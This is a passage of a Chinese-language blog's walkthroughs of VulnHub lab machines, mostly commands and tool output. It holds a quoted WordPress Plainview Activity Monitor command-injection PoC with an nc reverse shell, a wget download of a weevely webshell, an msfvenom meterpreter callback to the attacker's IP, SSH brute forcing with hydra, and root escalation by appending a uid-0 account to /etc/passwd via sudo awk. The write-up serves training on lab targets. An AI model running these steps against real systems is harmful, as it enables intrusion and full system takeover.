(ECDSA)</span><br><span class="line">|_  256 e6:3a:13:8a:77:84:be:08:57:d2:36:8a:18:c9:09:d6 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 5ECF6AFD7D00CCBE6B3C7AA8FD31BDE8</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: POST OPTIONS GET HEAD</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Hacker_James</span><br><span class="line">MAC Address: 08:00:27:0D:02:21 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.070 days (since Tue Mar 17 06:51:52 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;262 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-11"><a class="markdownIt-Anchor" href="#web路径枚举-11"></a> Web路径枚举</h2><p>尝试爆破80端口下的Web路径</p><p><code>dirb http://192.168.31.36/ -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.36&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.36&#x2F;css&#x2F;                                         </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.36&#x2F;html&#x2F;                                        </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.36&#x2F;img&#x2F;                                         </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.36&#x2F;index.html (CODE:200|SIZE:3135)                           </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.36&#x2F;js&#x2F;                                          </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.36&#x2F;server-status (CODE:403|SIZE:278)                         </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.36&#x2F;wordpress&#x2F;</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-11"><a class="markdownIt-Anchor" href="#漏洞利用-11"></a> 漏洞利用</h2><p>枚举wordpress账户的用户名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;192.168.31.36&#x2F;wordpress&#x2F; -e u</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] web</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure><p>尝试爆破弱口令，失败</p><p>浏览静态文件时发现图片文件<code>/img/flaghost.png</code><br />图片本身并没有有效信息<br />下载至本地，用LSB隐写检测程序<code>zsteg</code>检测图片</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zsteg flaghost.png </span><br><span class="line">meta Make           .. text: &quot;passw@45&quot;</span><br></pre></td></tr></table></figure><p>得到字符串<code>passw@45</code></p><p>这里尝试过用这个字符串作为密码来登入wordpress和ssh服务，但都失败<br />尝试后发现路径<code>/passw@45/</code><br />该路径下存在文本<code>flag2.txt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">i+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ +++++ +++++ +++++ .&lt;+++ +[-&gt;- ---&lt;]</span><br><span class="line">&gt;--.- --.&lt;+ +++++ [-&gt;-- ----&lt; ]&gt;--- -.&lt;++ +[-&gt;+ ++&lt;]&gt; +++++ .&lt;+++ ++[-&gt;</span><br><span class="line">+++++ &lt;]&gt;.+ +.+++ +++++ .---- --.&lt;+ ++[-&gt; +++&lt;] &gt;++++ .&lt;+++ ++++[ -&gt;---</span><br><span class="line">----&lt; ]&gt;-.&lt; +++[- &gt;---&lt; ]&gt;--- .+.-- --.++ +.&lt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>brainfuck编码</p><p><a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a><br />在这个链接解码后得到账户<br /><code>web:Hacker@4514</code><br />这个账户可以用于登入wordpress服务，也可以登入ssh服务</p><hr /><p>这里赘述一下wordpress的渗透思路<br />登入wordpress之后在Plugins面板看到<code>Plainview Activity Monitor</code></p><p>搜索相关漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Plainview Activity Monitor</span><br><span class="line">----------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                           |  Path</span><br><span class="line">                                                                                         | (&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;)</span><br><span class="line">----------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection | exploits&#x2F;php&#x2F;webapps&#x2F;45274.html</span><br><span class="line">----------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure><p>阅读相关文档</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;45274.html</span><br><span class="line"></span><br><span class="line">PoC:</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!--  Wordpress Plainview Activity Monitor RCE</span><br><span class="line">        [+] Version: 20161228 and possibly prior</span><br><span class="line">        [+] Description: Combine OS Commanding and CSRF to get reverse shell</span><br><span class="line">        [+] Author: LydA(c)ric LEFEBVRE</span><br><span class="line">        [+] CVE-ID: CVE-2018-15877</span><br><span class="line">        [+] Usage: Replace 127.0.0.1 &amp; 9999 with you ip and port to get reverse shell</span><br><span class="line">        [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well</span><br><span class="line">  --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;&#x2F;&#39;)&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;localhost:8000&#x2F;wp-admin&#x2F;admin.php?page&#x3D;plainview_activity_monitor&amp;tab&#x3D;activity_tools&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;ip&quot; value&#x3D;&quot;google.fr| nc -nlvp 127.0.0.1 9999 -e &#x2F;bin&#x2F;bash&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;lookup&quot; value&#x3D;&quot;Lookup&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit request&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">  &lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure><p>这里则需要访问<code>/wordpress/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools</code></p><p>个人尝试POC所给出的反弹Shell命令时无效，选择先上传php木马再上传meterpreter后门程序的方法</p><p>这里需要注意一点，输入框的相关代码如下<br /><code>&lt;input aria-required=&quot;true&quot; class=&quot;text required validates&quot; id=&quot;plainview_sdk_pvam_form2_inputs_text_ip&quot; maxlength=&quot;15&quot; name=&quot;ip&quot; required=&quot;true&quot; size=&quot;15&quot; type=&quot;text&quot; value=&quot;&quot;&gt;</code><br />maxlength会限制输入的长度，size会限制显示已输入字符的长度，使用F12适当修改即可</p><p>尝试命令注入<br /><code>a.b|ls</code><br />回显得到文件列表</p><p>本地构建php后门并开启HTTP服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">weevely generate pass shell.php</span><br><span class="line">python -m SinpleHTTPServer 9900</span><br></pre></td></tr></table></figure><p>注入下载命令<br /><code>a.b|wget http://192.168.31.10:9900/shell.php</code></p><p>连接木马<br /><code>weevely http://192.168.31.36/wordpress/wp-admin/shell.php</code></p><p>查看系统版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">Linux jax 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:01:15 UTC 2019 i686 i686 i686 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure><p>构造后门程序<br /><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9933 -f elf &gt; msf.elf</code></p><p>MSF开启监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">set payload linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 9933</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>上传后门并执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_upload msf.elf &#x2F;tmp&#x2F;msf.elf</span><br><span class="line">chmod +x &#x2F;tmp&#x2F;msf.elf</span><br><span class="line">.&#x2F;msf.elf &amp;</span><br></pre></td></tr></table></figure><p>MSF接收到shell<br />之后可能需要靠玩家开脑洞切换到web账户（比如看到passwd文件里存在web账户联想到密码共用）</p><h2 id="权限提升-11"><a class="markdownIt-Anchor" href="#权限提升-11"></a> 权限提升</h2><p>登入SSH服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ssh web@192.168.31.36</span><br><span class="line">Hacker@4514</span><br><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for web on jax:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User web may run the following commands on jax:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;awk</span><br></pre></td></tr></table></figure><p>可以以root权限执行awk命令<br />可以用awk命令修改文件<code>/etc/passwd</code></p><p>查看文件<code>/etc/passwd</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd</span><br><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:&#x2F;run&#x2F;systemd&#x2F;netif:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:&#x2F;run&#x2F;systemd&#x2F;resolve:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false</span><br><span class="line">syslog:x:104:108::&#x2F;home&#x2F;syslog:&#x2F;bin&#x2F;false</span><br><span class="line">_apt:x:105:65534::&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">lxd:x:106:65534::&#x2F;var&#x2F;lib&#x2F;lxd&#x2F;:&#x2F;bin&#x2F;false</span><br><span class="line">messagebus:x:107:111::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;false</span><br><span class="line">uuidd:x:108:112::&#x2F;run&#x2F;uuidd:&#x2F;bin&#x2F;false</span><br><span class="line">dnsmasq:x:109:65534:dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;misc:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:110:65534::&#x2F;var&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mysql:x:111:117:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">user-a:x:1000:1000:uname-a,,,:&#x2F;home&#x2F;uname-a:&#x2F;bin&#x2F;bash</span><br><span class="line">web:x:1001:1000::&#x2F;home&#x2F;web:&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p>构造账户信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -6 hackforfun</span><br><span class="line">    $6$qlYFR0rRnblVOfau$jH&#x2F;WAe8jTWMJjZ8&#x2F;eO77&#x2F;JCPHwbSwu1f9LAcv54xbyEfGdTrwaSBhpDIqDRDRb.AnP9QVJg1T9fftOrZH1zsQ1</span><br><span class="line">echo &#39;echo &#39;test:$6$DwMIt8OMOkuT9TVw$Wf4dJhyXDSlGCvseOFVXDc2qzE53zeN.IAPBKVeuFOKIihknB.kmBwqzQnp.RlibevBoJzcDLzSlkDF7OdTIK0:0:0::&#x2F;:&#x2F;bin&#x2F;bash&#39; &gt; &#x2F;tmp&#x2F;1&#39;</span><br></pre></td></tr></table></figure><p>openssl命令需在本地运行</p><p>写入账户信息<br /><code>sudo -u root awk '/web:\/bin\/sh/&#123;system(&quot;cat /tmp/1&quot;)&#125;' /etc/passwd &gt;&gt; /etc/passwd</code></p><p>切换至root</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su test</span><br><span class="line">hackforfun</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><blockquote><p>localhost</p></blockquote><p>修改文件<code>/etc/hosts</code>，将<code>127.0.0.1 localhost</code>这一行前面加上’#’，再写入<code>IP localhost</code>。这样就解决了点击链接时总是跳转localhost的问题。本地测试时，Chrome访问localhost还是会有问题，而Firefox可以正常访问。</p><blockquote><p>awk</p></blockquote><p>需要通过正则匹配到文件最后的一段字符串，再写入账户信息，否则写入过多数据。</p><blockquote><p>当你收集到的信息越少的时候，需要继续挖掘的地方就越多</p></blockquote><p>参考资料</p><blockquote><p><a href="https://www.cnblogs.com/jackchen001/p/7111324.html">awk.write</a></p></blockquote><hr /><h1 id="deception"><a class="markdownIt-Anchor" href="#deception"></a> <a href="https://www.vulnhub.com/entry/haclabs-deception,427/">Deception</a></h1><p><code>2020/03/19 19:06:44</code></p><h2 id="端口扫描-12"><a class="markdownIt-Anchor" href="#端口扫描-12"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.207</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.207</span><br><span class="line">Host is up (0.00040s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 9d:d0:98:da:0d:32:3d:0b:3f:42:4d:d7:93:4f:fd:60 (RSA)</span><br><span class="line">|   256 4c:f4:2e:24:82:cf:9c:8d:e2:0c:52:4b:2e:a5:12:d9 (ECDSA)</span><br><span class="line">|_  256 a9:fb:e3:f4:ba:d6:1e:72:e7:97:25:82:87:6e:ea:01 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET POST OPTIONS HEAD</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">MAC Address: 08:00:27:5B:20:2A (Oracle VirtualBox virtual NIC)</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Uptime guess: 14.153 days (since Wed Mar  4 23:18:19 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;263 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-12"><a class="markdownIt-Anchor" href="#web路径枚举-12"></a> Web路径枚举</h2><p><code>dirb http://192.168.31.207 -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.207&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.207&#x2F;index.html (CODE:200|SIZE:11026)                                                                                    </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.207&#x2F;javascript&#x2F;                                                                                            </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.207&#x2F;phpmyadmin&#x2F;                                                                                            </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.207&#x2F;server-status (CODE:403|SIZE:279)                                                                                   </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.207&#x2F;wordpress&#x2F;</span><br><span class="line"></span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;192.168.31.207&#x2F;wordpress&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.207&#x2F;wordpress&#x2F;index.php (CODE:301|SIZE:0)                                                                               </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.207&#x2F;wordpress&#x2F;robots.txt (CODE:200|SIZE:22)</span><br></pre></td></tr></table></figure><p>wordpres框架内的链接指向的主机为localhost，需要将文件<code>/etc/hosts</code>中的<code>127.0.0.1 localhost</code>这一行注释，再写入<code>192.168.31.207 localhost</code>，使用firefox即可正常访问</p><h2 id="漏洞利用-12"><a class="markdownIt-Anchor" href="#漏洞利用-12"></a> 漏洞利用</h2><p>访问<code>/wordpress/robots.txt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow : &#x2F;robots.html</span><br></pre></td></tr></table></figure><p>访问<code>/wordpress/robots.html</code><br />分析js得知点击&quot;show quest&quot;15次之后会跳转至&quot;admindelete.html&quot;</p><p>访问<code>/wordpress/admindelete.html</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOL,A Noob is looking for a hint</span><br></pre></td></tr></table></figure><p>访问<code>/wordpress/himt.html</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please collect all the API tokens availabe on the home page</span><br></pre></td></tr></table></figure><p>在页面<code>/</code>收集到四段API Token</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">API old0 : 5F4DCC3B5AA</span><br><span class="line">API old1 : 765D61D8</span><br><span class="line">API old2 : 327DEB</span><br><span class="line">API new : 882CF99</span><br></pre></td></tr></table></figure><p>整理这些API</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat pass </span><br><span class="line"></span><br><span class="line">5F4DCC3B5AA</span><br><span class="line">765D61D8</span><br><span class="line">327DEB</span><br><span class="line">882CF99</span><br><span class="line">5F4DCC3B5AA765D61D8327DEB882CF99</span><br></pre></td></tr></table></figure><p>枚举wordpress框架的用户名/插件/主题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;192.168.31.207&#x2F;wordpress&#x2F; -e u ap at</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] haclabs</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] yash</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure><p>未发现关于插件与主题的有效信息</p><p>整理得到用户名字典</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat user</span><br><span class="line">yash</span><br><span class="line">haclabs</span><br></pre></td></tr></table></figure><p>将其用作口令字典来爆破wordpress登录框，失败</p><p>将其用作口令字典来爆破ssh服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydea -I -L user -P pass ssh:&#x2F;&#x2F;192.168.31.207</span><br><span class="line"></span><br><span class="line">[22][ssh] host: 192.168.31.207   login: yash   password: 5F4DCC3B5AA765D61D8327DEB882CF99</span><br></pre></td></tr></table></figure><p>得到ssh服务的账户</p><h2 id="权限提升-12"><a class="markdownIt-Anchor" href="#权限提升-12"></a> 权限提升</h2><p>登入ssh服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh yash@192.168.31.207</span><br><span class="line">5F4DCC3B5AA765D61D8327DEB882CF99</span><br></pre></td></tr></table></figure><p>在目录<code>/home/yash</code>下发现隐藏文件<code>.systemlogs</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat .systemlogs </span><br><span class="line"></span><br><span 